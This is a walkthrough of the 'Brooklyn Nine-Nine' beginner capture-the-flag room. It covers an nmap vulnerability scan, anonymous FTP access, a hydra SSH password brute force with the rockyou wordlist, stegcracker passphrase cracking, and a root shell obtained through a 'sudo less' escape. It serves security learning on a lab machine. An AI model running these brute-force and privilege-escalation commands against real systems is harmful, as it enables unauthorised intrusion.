# Brooklyn Nine-Nine

## Introduction 
"This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box."

## Objectives
- Get into the machine and grab the user flag.
- Escalate privileges and grap the root flag.

## Walkthrough
Target Machine: `10.49.145.249`

--- 

### Scan the Target
Command: `nmap -sC -sV -p- --script=vuln 10.49.145.249`
- `sC` and `--script=vuln` - execute scripts under the vuln category to find the target's vulnerabilities
- `sV` - show the listening ports, services, and their versions
- `-p-` - scan all 65535 possible ports

Result:
- There are three ports listening:
  1. 21 (ftp) - vsftpd 3.0.3 
  2. 22 (ssh) - OpenSSH 7.6p1
  3. 80 (http) - Apache httpd 2.4.29
- FTP - the target runs a file sharing environment
- SSH - the target has a remote access to a filesystem
- Apache HTTP - the target runs a web server

### FTP Logon
Command: `ftp 10.49.145.249`

1. Execute the command.
2. Enter `anonymous` when asked for the username.
3. Press enter when asked for the password.

- The FTP environment allows anonymous login.

### FTP Enumeration
Commands: 
`ls` - show all files
  - There is a text file, `note_to_jake.txt`.
`get note_to_jake.txt -`
  - print the contents of the text file
  - Amy tells jake to change his weak password because holt will be mad if someone hacks into the nine nine.

 ### Two Ways Hack into the Machine

 ---
 
### 1. SSH Brute Force
Command: `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.145.249`
- `hydra` - a tool for brute-force attacks
- `-l jake` - use only the username jake
- `-P /usr/share/wordlists/rockyou.txt` - use the text file rockyou, a massive list of passwords
- `ssh://10.49.145.249` - attack the ssh service running on the target

Result:
- login: `jake`
- password: `987***`
- Hydra successfully brute-forced into Jake's account.

### 2. Steganography Brute Force
1. Download the cover image from the website: `wget http://10.49.145.249/brooklyn99.jpg`
2. Crack the passphrase: `stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt`
   - This will give you the file `brooklyn99.jpg.out`
3. Open the file: `cat brooklyn99.jpg`

--- 

### SSH Login
Commands: 
`ssh jake@10.49.145.249` or `ssh holt@10.49.145.249`
  - Type the password when prompted.
`whoami`
  - I am logged in as `jake`/`holt`
`pwd`
  - I am currently at `/home/jake`/`/home/holt`

### Filesystem Enumeration
Commands:
`ls /home`
  - There are three user directories: `amy`, `holt`, and `jake`
`ls /home/jake`
  - Jake's directory is empty.
`ls /home/amy`
  - Amy's directory is empty.
`ls /home/holt`
  - Holt's directory contains `user.txt`
`cat user.txt`
  - The user flag is `ee1***`.

### Privilege Escalation
Commands:
`sudo -l` 
  - I can use less as root without entering the password.
`sudo less /etc/hosts`
  - Use less with sudo to view a file with escalated privileges.
`!/bin/sh`
  - Spawn a shell that inherited the escalated privileges.

### The Root Flag
Commands:
`ls /root`
  - the root's directory contains `root.txt`
`cat root.txt`
  - the root flag is `63a***`.
